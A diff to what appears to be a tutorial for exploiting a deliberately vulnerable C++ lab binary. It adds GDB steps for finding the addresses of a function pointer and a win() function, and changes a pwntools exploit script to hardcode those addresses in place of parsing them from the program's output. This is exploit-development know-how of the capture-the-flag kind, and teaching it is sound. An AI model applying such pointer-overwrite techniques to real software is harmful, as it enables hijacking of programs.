@@ -55,7 +55,22 @@ g++ -std=c++11 -o vulnerable_code vulnerable_code.cpp -no-pie -g -Wno-unused-res
 
 #### 1. Finding Required Addresses
 
-The program already gives us all the necessary addresses at startup. We will capture these addresses in our exploit script.
+The program no longer automatically prints the addresses. You need to find these addresses manually using GDB:
+
+**Finding Addresses with GDB:**
+
+```bash
+gdb ./vulnerable_code
+(gdb) break main
+(gdb) run
+(gdb) p &gTarget.fn
+$1 = (void (**)()) 0x404040
+(gdb) p win
+$2 = {void (void)} 0x4011a0 <win()>
+(gdb) quit
+```
+
+Note down these addresses - you'll use them in your exploit script.
 
 #### 2. Detecting the Vulnerability with GDB (Step by Step)
 
@@ -134,13 +149,9 @@ import re
 # Start the process with pwntools
 p = process("./vulnerable_code")
 
-# Capture the program's initial output to get addresses
-initial_output = p.recvuntil(b"> ").decode()
-print(initial_output)
-
-# Extract addresses using regex
-target_fn_addr = int(re.search(r"&gTarget\.fn = (0x[0-9a-f]+)", initial_output).group(1), 16)
-win_addr = int(re.search(r"&win\s+= (0x[0-9a-f]+)", initial_output).group(1), 16)
+# Manually found addresses - write the addresses you found with GDB here
+target_fn_addr = 0x404040  # Address of &gTarget.fn from GDB
+win_addr = 0x4011a0        # Address of win function from GDB
 
 log.info(f"Target &gTarget.fn address: {hex(target_fn_addr)}")
 log.info(f"Target &win address: {hex(win_addr)}")
